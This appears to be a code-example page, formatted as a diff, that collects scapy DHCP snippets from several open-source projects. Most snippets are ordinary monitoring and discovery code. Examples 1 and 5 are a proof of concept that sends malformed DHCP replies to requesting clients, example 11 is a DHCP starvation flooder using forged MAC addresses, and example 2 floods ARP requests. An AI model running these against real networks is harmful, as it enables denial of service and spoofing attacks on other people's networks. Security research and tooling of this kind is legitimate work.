@@ -1,0 +1,380 @@
+示例1: build_dhcp
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DHCP [as 别名]
+def build_dhcp(pdiscover):
+    req_addr = None
+    server_id = None
+    vendor_class = None
+    try:
+        for m in pdiscover[DHCP].options:
+            n, v = m
+            if n == "requested_addr":
+                req_addr = v
+            elif n == "server_id":
+                server_id = v
+            elif n == "vendor_class_id":
+                vendor_class = v
+    except:
+        pass
+    print "[i] --> received vendor_class = %s" % vendor_class
+    e_dst = pdiscover[Ether].src
+
+    p = Ether(dst=e_dst) / IP(src=server_id, dst=req_addr or "0.0.0.0") / UDP(sport=67, dport=68, len=9000)
+    p[UDP].chksum = get_udp_checksum(p)
+    return p 
+开发者ID:tintinweb，项目名称:pub，代码行数:23，代码来源:poc.py
+
+
+
+ 
+示例2: scapy_send_arp_requests
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DHCP [as 别名]
+def scapy_send_arp_requests(number_of_packets):
+    arp_request = Ether(src=ethernet_src, dst='ff:ff:ff:ff:ff:ff') /\
+                  ARP(op=1, hwsrc=ethernet_src, hwdst='00:00:00:00:00:00', psrc=ip_src, pdst=ip_dst)
+    sendp(arp_request, count=number_of_packets, verbose=False)
+# endregion
+
+
+# region Send DHCP Discover packets in raw-packet 
+开发者ID:raw-packet，项目名称:raw-packet，代码行数:10，代码来源:time_test.py
+
+
+示例3: raw_packet_send_dhcp_discover_requests
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DHCP [as 别名]
+def raw_packet_send_dhcp_discover_requests(number_of_packets):
+    for _ in range(number_of_packets):
+        dhcp_discover_request = dhcp.make_discover_packet(ethernet_src_mac=ethernet_src,
+                                                          ethernet_dst_mac="ff:ff:ff:ff:ff:ff",
+                                                          ip_src="0.0.0.0", ip_dst="255.255.255.255",
+                                                          udp_src_port=68, udp_dst_port=67,
+                                                          transaction_id=randint(1, 4294967295),
+                                                          client_mac=ethernet_src,
+                                                          host_name="time_test")
+        global_socket.send(dhcp_discover_request)
+# endregion
+
+
+# region Send DHCP Discover packets in scapy 
+开发者ID:raw-packet，项目名称:raw-packet，代码行数:16，代码来源:time_test.py
+
+
+
+ 
+示例4: scapy_send_dhcp_discover_requests
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DHCP [as 别名]
+def scapy_send_dhcp_discover_requests(number_of_packets):
+    for _ in range(number_of_packets):
+        dhcp_discover_request = Ether(src=ethernet_src, dst='ff:ff:ff:ff:ff:ff') /\
+                                IP(src='0.0.0.0', dst='255.255.255.255') /\
+                                UDP(dport=67, sport=68) /\
+                                BOOTP(chaddr=ethernet_src, xid=randint(1, 4294967295)) /\
+                                DHCP(options=[('message-type', 'discover'), 'end'])
+        sendp(dhcp_discover_request, verbose=False)
+# endregion
+
+
+# region Send DNS Request packets in raw-packet 
+开发者ID:raw-packet，项目名称:raw-packet，代码行数:14，代码来源:time_test.py
+
+
+示例5: detect_dhcp
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DHCP [as 别名]
+def detect_dhcp(p):
+    print "[i] --> packet matched bpf"
+    if BOOTP not in p or p[UDP].sport != 68 or p[UDP].dport != 67:
+        print "[!] --> skipping unexpected packet"
+        #p.show()
+        return
+
+    print "[i] got DHCP request"
+    p.show()
+    print "[+] building malformed reply ..."
+    reply = build_dhcp(p)
+    reply.show()
+    print "[+] sending malformed reply ..."
+    sendp(reply, iface=conf.iface, verbose=True) 
+开发者ID:tintinweb，项目名称:pub，代码行数:16，代码来源:poc.py
+
+
+
+ 
+示例6: _packet_handler
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DHCP [as 别名]
+def _packet_handler(self, pkt):
+        try:
+            if pkt.haslayer(DHCP):
+                self._handle_dhcp(pkt)
+            elif pkt.haslayer(UDP) and pkt[UDP].dport == 1900:
+                self._handle_ssdp(pkt)
+        except Exception as e:
+            self.logger.error("Failed to handle packet")
+            self.logger.exception(e) 
+开发者ID:usableprivacy，项目名称:upribox，代码行数:11，代码来源:sniff_thread.py
+
+
+示例7: _handle_dhcp
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DHCP [as 别名]
+def _handle_dhcp(self, pkt):
+        # self.logger.error(pkt[DHCP].command())
+        params = {}
+        params['mac'] = str(":".join(hexstr(pkt[BOOTP].chaddr, onlyhex=True).split(" ")[:6])).lower()
+
+        for entry in pkt[DHCP].options:
+            if entry[0] == "message-type":
+                params['message-type'] = entry[1]
+            elif entry[0] == "vendor_class_id":
+                # self.logger.info("%s %s", entry[0], entry[1])
+                params['dhcp_vendor'] = entry[1]
+            elif entry[0] == 'requested_addr':
+                params['ip'] = entry[1]
+            elif entry[0] == 'hostname':
+                params['hostname'] = entry[1]
+            elif entry[0] == 'param_req_list':
+                # DHCP fingerprint in fingerbank format
+                params['dhcp_fingerprint'] = ",".join([str(int(num, 16)) for num in hexstr(entry[1], onlyhex=True).split(" ")])
+
+        if params.get('message-type', 0) == 3 and check_preconditions(params.get('ip', None), params.get('mac', None)):
+            try:
+                insert_or_update_fingerprint(self.conn, **params)
+                self.logger.debug("registered dhcp: ip: {}, mac: {}".format(params.get('ip', None), params.get('mac', None)))
+            except TypeError as te:
+                self.logger.error(insert_or_update_fingerprint.__name__ + " needs keyword-only argument ip")
+            except sqlite3.Error as sqle:
+                self.logger.exception(sqle)
+            except ValueError as ve:
+                self.logger.exception(ve) 
+开发者ID:usableprivacy，项目名称:upribox，代码行数:31，代码来源:sniff_thread.py
+
+
+示例8: cmd_dhcp_discover
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DHCP [as 别名]
+def cmd_dhcp_discover(iface, timeout, verbose):
+    """Send a DHCP request and show what devices has replied.
+
+    Note: Using '-v' you can see all the options (like DNS servers) included on the responses.
+
+    \b
+    # habu.dhcp_discover
+    Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.5:bootpc / BOOTP / DHCP
+    """
+
+    conf.verb = False
+
+    if iface:
+        iface = search_iface(iface)
+        if iface:
+            conf.iface = iface['name']
+        else:
+            logging.error('Interface {} not found. Use habu.interfaces to show valid network interfaces'.format(iface))
+            return False
+
+    conf.checkIPaddr = False
+
+    hw = get_if_raw_hwaddr(conf.iface)
+
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    ip = IP(src="0.0.0.0",dst="255.255.255.255")
+    udp = UDP(sport=68,dport=67)
+    bootp = BOOTP(chaddr=hw)
+    dhcp = DHCP(options=[("message-type","discover"),"end"])
+
+    dhcp_discover = ether / ip / udp / bootp / dhcp
+
+    ans, unans = srp(dhcp_discover, multi=True, timeout=5)      # Press CTRL-C after several seconds
+
+    for _, pkt in ans:
+        if verbose:
+            print(pkt.show())
+        else:
+            print(pkt.summary()) 
+开发者ID:fportantier，项目名称:habu，代码行数:41，代码来源:cmd_dhcp_discover.py
+
+
+示例9: _process_packet_helper
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DHCP [as 别名]
+def _process_packet_helper(self, pkt):
+
+        if sc.ARP in pkt:
+            return self._process_arp(pkt)
+
+        if sc.DHCP in pkt:
+            return self._process_dhcp(pkt)
+
+        # SYN-ACK response to SYN scans
+        if sc.TCP in pkt and pkt[sc.TCP].flags == 'SA' and sc.IP in pkt:
+            tcp_layer = pkt[sc.TCP]
+            if tcp_layer.dport == SYN_SCAN_SOURCE_PORT and tcp_layer.ack == SYN_SCAN_SEQ_NUM + 1:
+                return self._process_syn_scan(pkt)
+
+        # Must have Ether frame and IP frame.
+        if not (sc.Ether in pkt and sc.IP in pkt):
+            return
+
+        src_mac = pkt[sc.Ether].src
+        dst_mac = pkt[sc.Ether].dst
+
+        src_oui = utils.get_oui(src_mac)
+        dst_oui = utils.get_oui(dst_mac)
+
+        # Include only devices for internal testing (if set)
+        if utils.TEST_OUI_LIST:
+            if not (src_oui in utils.TEST_OUI_LIST or
+                    dst_oui in utils.TEST_OUI_LIST):
+                return
+
+        # Ignore traffic to and from this host's IP
+        if self._host_state.host_ip in (pkt[sc.IP].src, pkt[sc.IP].dst):
+            return
+
+        # DNS
+        if sc.DNS in pkt:
+            self._process_dns(pkt)
+
+        # Commented out the following. We want to see traffic between device and gateway.
+        # # Ignore traffic to and from the gateway's IP
+        # if self._host_state.gateway_ip in (pkt[sc.IP].src, pkt[sc.IP].dst):
+        #    return
+
+        # TCP/UDP
+        if sc.TCP in pkt:
+            protocol = 'tcp'
+        elif sc.UDP in pkt:
+            protocol = 'udp'
+        else:
+            return
+
+        return self._process_tcp_udp_flow(pkt, protocol) 
+开发者ID:noise-lab，项目名称:iot-inspector-client，代码行数:54，代码来源:packet_processor.py
+
+
+示例10: _process_dhcp
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DHCP [as 别名]
+def _process_dhcp(self, pkt):
+        """
+        Extracts the client hostname from DHCP Request packets.
+
+        """
+        try:
+            option_dict = dict(
+                [t for t in pkt[sc.DHCP].options if isinstance(t, tuple)]
+            )
+
+        except Exception:
+            return
+
+        try:
+            device_hostname = option_dict.setdefault('hostname', '').decode('utf-8')
+        except Exception:
+            device_hostname = ''
+        resolver_ip = option_dict.setdefault('name_server', '')
+
+        with self._host_state.lock:
+
+            if device_hostname:
+
+                # Must be a DHCP Request broadcast
+                if pkt[sc.Ether].dst != 'ff:ff:ff:ff:ff:ff':
+                    return
+
+                device_mac = pkt[sc.Ether].src
+                device_id = utils.get_device_id(device_mac, self._host_state)
+
+                self._host_state.pending_dhcp_dict[device_id] = device_hostname
+                utils.log('[UPLOAD] DHCP Hostname:', device_hostname)
+
+            if resolver_ip:
+
+                # DHCP Offer broadcast
+                if pkt[sc.Ether].dst == 'ff:ff:ff:ff:ff:ff':
+                    device_id = 'broadcast'
+
+                # DHCP ACK from router to device. The following block may not
+                # actually be called at all, because the router is likely to
+                # send the ACK packet directly to the device (rather than arp
+                # spoofed)
+                else:
+                    device_ip = pkt[sc.IP].dst
+                    try:
+                        device_mac = self._host_state.ip_mac_dict[device_ip]
+                    except KeyError:
+                        return
+                    device_id = utils.get_device_id(
+                        device_mac, self._host_state)
+
+                self._host_state.pending_resolver_dict[device_id] = \
+                    resolver_ip
+
+                utils.log(
+                    '[UPLOAD] DHCP Resolver:', device_id, '-', resolver_ip) 
+开发者ID:noise-lab，项目名称:iot-inspector-client，代码行数:59，代码来源:packet_processor.py
+
+
+示例11: cmd_dhcp_starvation
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DHCP [as 别名]
+def cmd_dhcp_starvation(iface, timeout, sleeptime, verbose):
+    """Send multiple DHCP requests from forged MAC addresses to
+    fill the DHCP server leases.
+
+    When all the available network addresses are assigned, the DHCP server don't send responses.
+
+    So, some attacks, like DHCP spoofing, can be made.
+
+    \b
+    # habu.dhcp_starvation
+    Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.6:bootpc / BOOTP / DHCP
+    Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.7:bootpc / BOOTP / DHCP
+    Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.8:bootpc / BOOTP / DHCP
+    """
+
+    conf.verb = False
+
+    if iface:
+        iface = search_iface(iface)
+        if iface:
+            conf.iface = iface['name']
+        else:
+            logging.error('Interface {} not found. Use habu.interfaces to show valid network interfaces'.format(iface))
+            return False
+
+    conf.checkIPaddr = False
+
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    ip = IP(src="0.0.0.0",dst="255.255.255.255")
+    udp = UDP(sport=68, dport=67)
+    dhcp = DHCP(options=[("message-type","discover"),"end"])
+
+    while True:
+        bootp = BOOTP(chaddr=str(RandMAC()))
+        dhcp_discover = ether / ip / udp / bootp / dhcp
+        ans, unans = srp(dhcp_discover, timeout=1)      # Press CTRL-C after several seconds
+
+        for _, pkt in ans:
+            if verbose:
+                print(pkt.show())
+            else:
+                print(pkt.sprintf(r"%IP.src% offers %BOOTP.yiaddr%"))
+
+        sleep(sleeptime) 
+开发者ID:fportantier，项目名称:habu，代码行数:46，代码来源:cmd_dhcp_starvation.py
